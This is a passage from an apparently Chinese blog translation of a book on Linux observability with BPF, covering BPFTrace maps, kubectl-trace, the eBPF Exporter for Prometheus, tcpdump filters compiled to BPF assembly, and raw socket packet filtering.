class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# bpftrace /tmp/example.bt</span><br><span class="line">    Attaching 3 probes...</span><br><span class="line">    starting BPFTrace program</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    opening file descriptor: /tmp/example.bt</span><br><span class="line">    ^Cexiting BPFTrace program</span><br></pre></td></tr></table></figure><h5 id="动态映射"><a href="#动态映射" class="headerlink" title="动态映射"></a>动态映射</h5><p>BPFTrace实现的一项方便的功能是动态映射关联。 它可以动态生成BPF映射，你可以将其用于本书中看到的许多操作。所有映射关联都以字符<code>@</code>开头，后面跟要创建的映射的名称。 还可以通过为它们分配值来关联这些映射中的更新元素。</p><p>如果我们以本节开头的示例为例，我们可以汇总系统打开特定文件的频率。为此，我们需要计算内核在特定文件上运行open系统调用的次数，然后将这些计数器存储在映射中。为了识别这些聚合，我们可以使用文件路径作为映射的键。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kprobe:do_sys_open</span><br><span class="line">&#123;</span><br><span class="line"> @opens[str(arg1)] = count()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行程序后输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> bpftrace /tmp/example.bt</span></span><br><span class="line">    Attaching 3 probes...</span><br><span class="line">    starting BPFTrace program</span><br><span class="line">    ^Cexiting BPFTrace program</span><br><span class="line">    @opens[/var/lib/snapd/lib/gl/haswell/libdl.so.2]: 1</span><br><span class="line">    @opens[/var/lib/snapd/lib/gl32/x86_64/libdl.so.2]: 1</span><br><span class="line">    ...</span><br><span class="line">    @opens[/usr/lib/locale/en.utf8/LC_TIME]: 10</span><br><span class="line">    @opens[/usr/lib/locale/en_US/LC_TIME]: 10</span><br><span class="line">    @opens[/usr/share/locale/locale.alias]: 12</span><br><span class="line">    @opens[/proc/8483/cmdline]: 12</span><br></pre></td></tr></table></figure><p>如你所见，BPFTrace在停止程序执行时打印映射的内容。它汇总了内核在我们系统中打开文件的频率。 默认情况下，BPFTrace总是会在它终止时打印它创建的每个映射的内容。 您无需指定要打印的映射；你可以通过使用内置函数clear清除END块内的映射来更改该行为。 这是因为打印映射总是发生在<code>footer</code>块执行之后。</p><h4 id="kubectl-trace"><a href="#kubectl-trace" class="headerlink" title="kubectl-trace"></a>kubectl-trace</h4><p><code>kubectl-trace</code>是Kubernetes命令行kubectl的插件。它可以帮助你在Kubernetes集群中处理BPFTrace程序，而无需安装任何额外的包或模块。它通过使用容器镜像调度一个<code>Kubernetes job</code>来实现这一点，该容器镜像已经安装了运行程序所需的一切。 此镜像称为<code>trace-runner</code>，它也可以在公共Docker中使用。å</p><h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><p>你需要使用Go的工具链从其源存储库安装<code>kubectl-trace</code>，因为其开发人员不提供任何二进制包：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/iovisor/kubectl-trace/cmd/kubectl-trace</span><br></pre></td></tr></table></figure><p>在Go的工具链编译程序并将其放入路径后，kubectl的插件系统会自动检测到这个新插件。<code>kubectl-trace</code>会在你第一次执行它时自动下载它在集群中运行的Docker镜像。</p><h5 id="检查k8s节点"><a href="#检查k8s节点" class="headerlink" title="检查k8s节点"></a>检查k8s节点</h5><p>可以使用<code>kubectl-trace</code>来定位运行容器的节点和pod，也可以使用它来定位在这些容器上运行的进程。在第一种情况下，你几乎可以运行任何你想要的BPF程序。但是，在第二种情况下只能运行将用户空间探测器附加到这些进程的程序。</p><p>如果要在特定节点上运行BPF程序，则需要一个适当的标识符，以便Kubernetes将作业安排在适当的位置。有了这个标识符之后，运行程序就和运行你之前看到的程序类似。 如下所示我们运行单行来计算文件打开次数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl trace run node/node_identifier -e \</span><br><span class="line">      "kprobe:do_sys_open &#123; @opens[str(arg1)] = count() &#125;"</span><br></pre></td></tr></table></figure><p>我们使用命令<code>kubectl trace run</code>将其安排在特定的集群节点中。 我们使用语法<code>node/...</code>来告诉<code>kubectl-trace</code>我们正在针对集群中的一个节点。如果我们想针对特定的pod，我们可以将<code>node/</code>替换为<code>pod/</code>。</p><p>在特定容器上运行程序更加复杂</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kubectl trace run pod/pod_identifier -n application_name -e &lt;&lt;PROGRAM</span><br><span class="line">    uretprobe:/proc/$container_pid/exe:"main.main" &#123;</span><br><span class="line">      printf("exit: %d\n", retval)</span><br><span class="line">    &#125;</span><br><span class="line">PROGRAM</span><br></pre></td></tr></table></figure><p>在这个命令中有两件事情需要强调。第一个是我们需要容器中运行的应用程序的名称才能找到它的进程； 这对应于我们示例中的<code>application_name</code>， 需要使用在容器中执行的二进制文件的名称，例如<code>nginx</code>或<code>memc ached</code>。 通常，容器只运行一个进程，但这为我们提供了额外的保证，即我们将程序附加到正确的进程。第二个方面是在BPF程序中包含<code>$container_pid</code>。 这不是BPFTrace辅助函数，而是<code>kubectl-trace</code>用作进程标识符替换的占位符。在运行BPF程序之前，<code>trace-runner</code>用适当的标识符替换占位符，并将我们的程序附加到正确的进程。</p><p>在本节和前面几节中，我们专注于更有效地运行BPF程序的工具，即使在容器环境中也是如此。 在下一节中，我们将讨论一个更好的工具，它将BPF程序收集的数据与开源监控系统Prometheus集成在一起。</p><h4 id="eBPF-Exporter"><a href="#eBPF-Exporter" class="headerlink" title="eBPF Exporter"></a>eBPF Exporter</h4><p><code>eBPF Exporter</code>是一个允许你自定义BPF跟踪指标导出到Prometheus的工具。Prometheus是一个高度可扩展的监控和警报系统。与其他监控系统不同的一个关键因素是它使用拉取策略来获取指标，而不是期望客户端将指标推送给它。这允许用户编写可以从任何系统收集指标的自定义导出器，Prometheus使用API模式提取它们。<code>eBPF Exporter</code>实现此API以从BPF程序中获取跟踪指标并将它们导入Prometheus。</p><h5 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h5><p>尽管<code>eBPF Exporter</code>提供二进制包，但我们建议从源代码安装它，因为通常没有新版本。从源代码构建还可以让你访问BCC（BPF 编译器集合）之上构建的更新功能。</p><p>要从源代码安装<code>eBPF Exporter</code>，你需要在计算机上已经安装BCC和Go的工具链。 有了这些先决条件后可以使用Go下载和构建二进制文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/cloudflare/ebpf_exporter/...</span><br></pre></td></tr></table></figure><h5 id="从BPF导出指标"><a href="#从BPF导出指标" class="headerlink" title="从BPF导出指标"></a>从BPF导出指标</h5><p><code>eBPF Exporter</code>使用YAML文件进行配置，你可以在其中指定要从系统收集的指标、生成这些指标的BPF程序以及它们如何转换为Prometheus。当 Prometheus向<code>eBPF Exporter</code>发送请求以提取指标时，此工具会将BPF程序正在收集的信息转换为指标值。<code>eBPF Exporter</code>捆绑了许多系统收集非常有用的信息的程序，例如周期指令(IPC)和CPU缓存命中率。</p><p><code>eBPF Exporter</code>的简单配置文件包括三个主要部分。在第一部分中定义了希望Prometheus从系统中提取的指标。 在这里可以将BPF映射中收集的数据转换为Prometheus理解的指标。 如下示例所示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">programs:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">timers</span></span><br><span class="line"><span class="attr">metrics:</span> </span><br><span class="line"><span class="attr">counters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">timer_start_total</span></span><br><span class="line"><span class="attr">help:</span> <span class="string">Timers</span> <span class="string">fired</span> <span class="string">in</span> <span class="string">the</span> <span class="string">kernel</span> </span><br><span class="line"><span class="attr">table:</span> <span class="string">counts</span></span><br><span class="line"><span class="attr">labels:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">function</span> </span><br><span class="line"><span class="attr">size:</span> <span class="number">8</span></span><br><span class="line"><span class="attr">decoders:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ksym</span></span><br></pre></td></tr></table></figure><p>我们定义了一个名为<code>timer_start_total</code>的指标，它聚合了内核启动定时器的频率。我们还指定我们希望从名为<code>counts</code>的BPF映射中收集此信息。 最后，我们为映射的键定义了一个翻译函数。 这是必要的，因为映射键通常是指向信息的指针，我们希望向Prometheus发送实际的函数名称。</p><p>本例中的第二部分描述了我们想要将BPF程序附加到的探针。在这种情况下，我们要跟踪计时器开始调用； 我们使用<code>tracepoint timer:timer_start</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tracepoints:</span><br><span class="line">  timer:timer_start: tracepoint__timer__timer_start</span><br></pre></td></tr></table></figure><p>这里我们告诉<code>eBPF Exporter</code>，我们希望将BPF函数<code>tracepoint__timer__timer_start</code>附加到这个特定的跟踪点。 接下来让我们看看如何声明该函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code: |</span><br><span class="line">BPF_HASH(counts, u64);</span><br><span class="line"><span class="comment">// Generates function tracepoint__timer__timer_start </span></span><br><span class="line">TRACEPOINT_PROBE(timer, timer_start) &#123;</span><br><span class="line">  counts.increment((u64) args-&gt;function);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>eBPF Exporter</code>使用BCC编译程序，因此我们可以访问它的所有宏和帮助程序。前面的代码片段使用宏<code>TRACEPOINT_PROBE</code>生成最终函数，我们将附加到名为<code>tracepoint__timer__timer_start</code>的跟踪点。</p><p>Cloudflare使用<code>eBPF Exporter</code>来监控其所有数据中心的指标。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>在本章中，我们讨论了一些系统分析工具。当你需要调试系统上的任何异常时，这些工具可以随时使用。所有工具都抽象了我们在前几章中看到的概念，以帮助你使用BPF即便你的环境还没有准备好。这是BPF与其他众多分析工具相比的优势之一；因为任何现代Linux内核都包含BPF虚拟机，所以你可以在其上构建利用这些强大功能的新工具。</p><p>还有许多其他工具将BPF用于类似目的，例如<code>Cilium</code>和<code>Sysdig</code>，我们鼓励你去尝试使用它们。</p><p>在接下来的章节中，我们将深入探讨它的网络功能。我们将展示如何分析任何网络中的流量以及如何使用BPF来控制网络中的消息。</p><h2 id="第六章节"><a href="#第六章节" class="headerlink" title="第六章节"></a>第六章节</h2><h3 id="Linux网络和BPF"><a href="#Linux网络和BPF" class="headerlink" title="Linux网络和BPF"></a>Linux网络和BPF</h3><p>从网络的角度来看，我们将BPF程序用于两个用途：数据包捕获和过滤。</p><p>这意味着用户空间程序可以将过滤器附加到任何套接字并提取有关流经它的数据包的信息，并允许/禁止/重定向某些类型的数据包，因为它们在该级别可以看到。</p><p>本章的目的是解释BPF程序在Linux内核网络堆栈中网络数据路径的不同阶段如何与<code>Socket Buffer</code>结构进行交互。 我们将确定两种类型的程序作为常见用例</p><ul><li>与套接字相关的程序类型</li><li>基于BPF的流量控制分类器编写的程序</li></ul><p><code>Socket Buffer</code>结构，也称为SKB或<code>sk_buff</code>，是内核中为每个发送或接收的数据包创建和使用的结构。通过读取SKB可以传递或丢弃数据包并填充BPF映射以创建有关当前流量的统计信息和流量指标。</p><p>此外，一些BPF程序允许你操作SKB，并通过扩展转换最终数据包，以重定向或改变它们的基本结构。例如，在仅使用IPv6的系统上可以编写一个程序，将所有收到的数据包从IPv4转换为 IPv6，这可以通过修改数据包的SKB来完成。</p><p>理解网络中的BPF和eBPF的关键是需要了解我们可以编写的不同类型的程序之间的差异，以及不同的程序如何导致相同的结果；在下一节中，我们将介绍在套接字级别进行过滤的两种方法：使用经典的BPF过滤器，以及使用附加到套接字的eBPF程序。</p><h3 id="BPF和包过滤"><a href="#BPF和包过滤" class="headerlink" title="BPF和包过滤"></a>BPF和包过滤</h3><p>如前所述，BPF过滤器和eBPF程序是BPF程序在网络环境中的主要用例。然而最开始BPF程序是包过滤的同义词。</p><p>包过滤仍然是最重要的用例之一，并且已经从经典的BPF (cBPF)扩展到<code>Linux 3.19</code>中的eBPF，并在过滤程序类型<code>BPF_PROG_TYPE_SOCKET_FILTER</code>中添加了与映射相关的功能。</p><p>过滤器主要可用于三个高级场景：</p><ul><li>实时流量丢弃（例如，仅允许用户数据报协议UDP流量，丢弃其他任何内容）</li><li>实时观察流入系统的一组过滤数据包</li><li>使用<code>pcap</code>格式对实时系统上捕获的网络流量进行回顾分析</li></ul><p>术语<code>pcap</code>来自两个词的结合：数据包(packet)和捕获(capture)。<code>pcap</code>格式在数据包捕获库 <code>libpcap</code>的库中实现，是用于数据包捕获的特定域API。 当你希望在实时系统上捕获的一组数据包能够直接保存到文件中，方便后续使用<code>pcap</code>格式导出的数据包流的工具进行分析时，这种格式在调试场景中很有用。</p><p>在接下来的部分中，我们将展示两种不同的方式来应用BPF程序的包过滤。首先，我们展示了像<code>tcpdump</code>这样的常见且广泛使用的工具如何充当用作过滤器的BPF程序的更高级的接口。然后我们使用<code>BPF_PROG_TYPE_SOCKET_FILTER</code>BPF程序类型编写并加载我们自己的程序。</p><h4 id="tcpdump和BPF表达式"><a href="#tcpdump和BPF表达式" class="headerlink" title="tcpdump和BPF表达式"></a>tcpdump和BPF表达式</h4><p>说到实时流量分析和观察，每个人都知道的命令行工具之一就是<code>tcpdump</code>。 本质上是<code>libpcap</code>的前端，它允许用户定义高级过滤表达式。<code>tcpdump</code>所做的是从你选择的网络接口（或任何接口）读取数据包，然后将接收到的数据包的内容写入标准输出或文件。然后可以使用<code>pcap</code>过滤器语法过滤数据包流。<code>pcap</code>过滤器语法是一种DSL，使用一组原语组成的高级表达式集过滤数据包，这些原语通常比BPF汇编更容易记住。解释<code>pcap</code>过滤器语法中所有可能的原语和表达式超出了本章的范围，具体可以使用<code>man 7 pcap-filter</code>查看。</p><p>场景是我们在一个Linux机器中，它在端口<code>8080</code>上公开了一个Web服务器；这个Web服务器没有记录它接收到的请求，我们想知道它是否正在接收任何请求以及这些请求是如何流入的，因为所服务应用程序的客户抱怨在浏览时无法获得任何响应产品页面。在这一点上，我们只知道客户正在使用由该Web服务器提供的Web应用程序连接到我们的产品页面，并且总是发生这种情况，我们不知道是什么原因，因为最终用户通常不会调试服务，不幸的是我们没有在这个系统中部署任何日志记录或错误报告策略，因此我们在调查问题时完全是盲目的。幸运的是，有一个工具可以帮助我们！它是<code>tcpdump</code>，可以告诉它只过滤在我们系统中流动的IPv4数据包，这些数据包在端口8080上使用传输控制协议 (TCP)。因此，我们将能够分析Web服务器的流量。</p><p>以下是使用<code>tcpdump</code>进行过滤的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump -n 'ip and tcp port 8080'</span><br></pre></td></tr></table></figure><p>让我们看看这个命令中发生了什么：</p><ul><li><code>-n</code> 是为了告诉<code>tcpdump</code>不要将地址转换为各自的名称，我们想查看源地址和目标地址。</li><li><code>ip and tcp port 8080</code>是<code>tcpdump</code>用于过滤数据包的<code>pcap</code>过滤器表达式。ip表示 <code>IPv4</code>，它是一个连词，表示一个更复杂的过滤器，以允许添加更多表达式来匹配，然后我们指定我们只对来自tcp端口8080或到达端口8080的tcp数据包感兴趣。在这种情况下，更好的过滤器应该是<code>tcp dst port 8080</code>，因为我们只对目标端口为<code>8080</code>的数据包感兴趣，而不是来自它的数据包。</li></ul><p>其输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class="line">    listening on wlp4s0, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">    12:04:29.593703 IP 192.168.1.249.44206 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 1:325, ack 1, win 343,</span><br><span class="line">       options [nop,nop,TS val 25580829 ecr 595195678],</span><br><span class="line">       length 324: HTTP: GET / HTTP/1.1</span><br><span class="line">    12:04:29.596073 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [.],</span><br><span class="line">       seq 1:1449, ack 325, win 507,</span><br><span class="line">       options [nop,nop,TS val 595195731 ecr 25580829],</span><br><span class="line">       length 1448: HTTP: HTTP/1.1 200 OK</span><br><span class="line">    12:04:29.596139 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [P.],</span><br><span class="line">       seq 1449:2390, ack 325, win 507,</span><br><span class="line">       options [nop,nop,TS val 595195731 ecr 25580829],</span><br><span class="line">       length 941: HTTP</span><br><span class="line">    12:04:46.242924 IP 192.168.1.249.44206 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 660:996, ack 4779, win 388,</span><br><span class="line">       options [nop,nop,TS val 25584934 ecr 595204802],</span><br><span class="line">       length 336: HTTP: GET /api/products HTTP/1.1</span><br><span class="line">    12:04:46.243594 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [P.],</span><br><span class="line">       seq 4779:4873, ack 996, win 503,</span><br><span class="line">       options [nop,nop,TS val 595212378 ecr 25584934],</span><br><span class="line">       length 94: HTTP: HTTP/1.1 500 Internal Server Error</span><br><span class="line">    12:04:46.329245 IP 192.168.1.249.44234 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 471:706, ack 4779, win 388,</span><br><span class="line">       options [nop,nop,TS val 25585013 ecr 595205622],</span><br><span class="line">       length 235: HTTP: GET /favicon.ico HTTP/1.1</span><br><span class="line">    12:04:46.331659 IP 192.168.1.63.8080 &gt; 192.168.1.249.44234: Flags [.],</span><br><span class="line">       seq 4779:6227, ack 706, win 506,</span><br><span class="line">       options [nop,nop,TS val 595212466 ecr 25585013],</span><br><span class="line">       length 1448: HTTP: HTTP/1.1 200 OK</span><br><span class="line">    12:04:46.331739 IP 192.168.1.63.8080 &gt; 192.168.1.249.44234: Flags [P.],</span><br><span class="line">       seq 6227:7168, ack 706, win 506,</span><br><span class="line">       options [nop,nop,TS val 595212466 ecr 25585013],</span><br><span class="line">       length 941: HTTP</span><br></pre></td></tr></table></figure><p>可以看到，我们有一堆请求进展顺利，返回200 OK状态代码，但在<code>/api/products</code>端点上还有一个带有500内部服务器错误代码的请求。表示我们在列出产品时服务器遇到问题！</p><p>此时，你可能会问，如果BPF程序有自己的语法，所有这些<code>pcap</code>过滤内容和<code>tcpdump</code>有什么关系？Linux上的<code>Pcap</code>过滤器被编译为BPF程序！而且因为<code>tcpdump</code>使用<code>pcap</code>过滤器进行过滤，这意味着每次使用过滤器执行<code>tcpdump</code>时，实际上是在编译和加载BPF程序来过滤数据包。幸运的是，通过将<code>-d</code>标志传递给<code>tcpdump</code>，你可以转储在使用指定过滤器时将加载的BPF指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump  -d  'ip and tcp port 8080'</span><br></pre></td></tr></table></figure><p>该过滤器与上一个示例中使用的过滤器相同，但由于<code>-d</code>标志，现在输出是一组BPF汇编指令。</p><p>输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(000) ldh      [12]</span><br><span class="line">(001) jeq      #0x800           jt 2jf 12</span><br><span class="line">(002) ldb      [23]</span><br><span class="line">(003) jeq      #0x6             jt 4jf 12</span><br><span class="line">(004) ldh      [20]</span><br><span class="line">(005) jset     #0x1fff          jt 12jf 6</span><br><span class="line">(006) ldxb     4*([14]&amp;0xf)</span><br><span class="line">(007) ldh      [x + 14]</span><br><span class="line">(008) jeq      #0x1f90          jt 11jf 9</span><br><span class="line">(009) ldh      [x + 16]</span><br><span class="line">(010) jeq      #0x1f90          jt 11jf 12</span><br><span class="line">(011) ret      #262144</span><br><span class="line">(012) ret      #0</span><br></pre></td></tr></table></figure><p>分析如下</p><p>ldh [12]：在偏移量12处从累加器加载(ld)一个(h)半字（16 位），这是<code>Ethertype</code>字段，第二层以太网帧结构如下图所示。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/1.png" alt="1"></p><p>jeq #0x800 jt 2 jf 12：如果 (eq) 相等则跳转(j) ；检查上一条指令中的<code>Ethertype</code>值是否等于<code>0x800</code>（这是 IPv4 的标识符），然后使用跳转目标，如果为真（jt）则为2，如果为假（jf）则为12，因此这将继续到下一个如果Internet协议是IPv4的指令——否则它将跳转到末尾并返回零。</p><p>ldb [23]：加载字节(ldb)，将从IP帧中加载更高层协议字段，该字段可在偏移量23处找到——偏移量23来自以太网第2层帧中头的14个字节的添加加上协议在IPv4头中的位置，即第9个，因此14+9=23。</p><p>jeq #0x6 jt 4 jf 12：如果相等，再跳一次。这种情况下，我们检查之前提取的协议是<code>0x6</code>，即TCP。如果是，我们跳到下一条指令(4)或者我们走到最后(12)——如果不是，我们丢弃数据包。</p><p>ldh [20]：这是另一个加载半字指令——在这种情况下，它是从IPv4头加载数据包偏移量+分片偏移量的值。</p><p>jset #0x1fff jt 12 6：如果我们在分片偏移中找到的任何数据为真，则此<code>jset</code>指令将跳转到12——否则，跳转到6，即下一条指令。指令<code>0x1fff</code>之后的偏移量告诉<code>jset</code>指令只查看最后13个字节的数据。（扩展为 0001 1111 1111 1111）</p><p>ldxb 4*([14]&amp;0xf)：将(b)加载(ld)到x中。该指令会将IP标头长度的值加载到x中。</p><p>ldh [x+14]：另一个加载半字指令将获取偏移量(x + 14)处的值，IP标头长度+14，这是数据包中源端口的位置。</p><p>jeq #0x1f90 jt 11 jf 9：如果(x + 14)处的值等于<code>0x1f90</code>（十进制的 8080），这意味着源端口将是<code>8080</code>，继续11或继续检查目标端口是否在端口8080上，如果是错误的，继续9 .</p><p>ldh [x + 16]：这是另一个加载半字指令，它将获取偏移量(x + 16)处的值，这是数据包中目标端口的位置。</p><p>jeq #0x1f90 jt 11 jf 12：这里如果相等再跳转一次，这次用来检查目的地是否为<code>8080</code>，跳转到11；如果不是，转至12并丢弃该数据包。</p><p>ret #262144：到达此指令时，会找到匹配项，从而返回匹配的快照长度。 默认情况下，此值为262144字节。 可以使用<code>tcpdump</code>中的<code>-s</code>参数对其进行调整。</p><p>如果只考虑以<code>8080</code>作为目标的数据包，而不是作为源的数据包，<code>tcpdump</code>示例如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump -d 'ip and tcp dst port 8080'</span><br><span class="line">(000) ldh      [12]</span><br><span class="line">(001) jeq      #0x800           jt 2jf 10</span><br><span class="line">(002) ldb      [23]</span><br><span class="line">(003) jeq      #0x6             jt 4jf 10</span><br><span class="line">(004) ldh      [20]</span><br><span class="line">(005) jset     #0x1fff          jt 10jf 6</span><br><span class="line">(006) ldxb     4*([14]&amp;0xf)</span><br><span class="line">(007) ldh      [x + 16]</span><br><span class="line">(008) jeq      #0x1f90          jt 9jf 10</span><br><span class="line">(009) ret      #262144</span><br><span class="line">(010) ret      #0</span><br></pre></td></tr></table></figure><p>除了像我们那样分析从<code>tcpdump</code>生成的程序集之外，你可能还想编写自己的代码来过滤网络数据包。事实证明，在这种情况下，最大的挑战将是实际调试代码的执行以确保它符合我们的期望； 在这种情况下，在内核源代码树中，<code>tools/bpf</code>中有一个名为<code>bpf_dbg.c</code>的工具，它本质上是一个调试器，允许加载程序和<code>pcap</code>文件以逐步测试执行。</p><p><code>tcpdump</code>也可以直接从<code>.pcap</code>文件中读取，并对其应用BPF过滤器。</p><h4 id="原始套接字的数据包过滤"><a href="#原始套接字的数据包过滤" class="headerlink" title="原始套接字的数据包过滤"></a>原始套接字的数据包过滤</h4><p><code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序类型允许你将BPF程序附加到套接字。它接收到的所有数据包都会以<code>sk_buff</code>结构体的形式传递给程序，然后程序可以决定是丢弃还是允许。这种程序还具有访问和处理映射的能力。</p><p>让我们看一个例子，看看如何使用这种BPF程序。</p><p>我们示例程序的目的是计算在观察下流经接口的TCP、UDP和互联网控制消息协议(ICMP)数据包的数量。为此，我们需要以下内容：</p><ul><li>可以看到数据包流动的BPF程序</li><li>加载程序并将其附加到网络接口的代码</li><li>用于编译程序并启动加载程序的脚本</li></ul><p>此时我们可以通过两种方式编写BPF程序：作为C代码然后编译为ELF文件，或者直接作为BPF程序集。对于这个例子，我们选择使用C代码来展示更高层次的抽象以及如何使用Clang来编译程序。</p><h5 id="BPF程序"><a href="#BPF程序" class="headerlink" title="BPF程序"></a>BPF程序</h5><p>这里BPF程序的主要职责是访问它接收到的数据包；检查其协议是TCP、UDP还是ICMP，然后在找到的协议的特定键上增加映射数组上的计数。</p><p>对于这个程序，我们将利用位于内核源码中<code>samples/bpf/bpf_load.c</code>中的帮助程序解析ELF文件的加载机制。 加载函数<code>load_bpf_file</code>能够识别某些特定的ELF节头，并将它们与相应的程序类型相关联。 代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> is_socket = <span class="built_in">strncmp</span>(event, <span class="string">"socket"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_kprobe = <span class="built_in">strncmp</span>(event, <span class="string">"kprobe/"</span>, <span class="number">7</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_kretprobe = <span class="built_in">strncmp</span>(event, <span class="string">"kretprobe/"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_tracepoint = <span class="built_in">strncmp</span>(event, <span class="string">"tracepoint/"</span>, <span class="number">11</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_raw_tracepoint = <span class="built_in">strncmp</span>(event, <span class="string">"raw_tracepoint/"</span>, <span class="number">15</span>) == <span class="number">0</span>; </span><br><span class="line"><span class="keyword">bool</span> is_xdp = <span class="built_in">strncmp</span>(event, <span class="string">"xdp"</span>, <span class="number">3</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_perf_event = <span class="built_in">strncmp</span>(event, <span class="string">"perf_event"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_cgroup_skb = <span class="built_in">strncmp</span>(event, <span class="string">"cgroup/skb"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_cgroup_sk = <span class="built_in">strncmp</span>(event, <span class="string">"cgroup/sock"</span>, <span class="number">11</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sockops = <span class="built_in">strncmp</span>(event, <span class="string">"sockops"</span>, <span class="number">7</span>) == <span 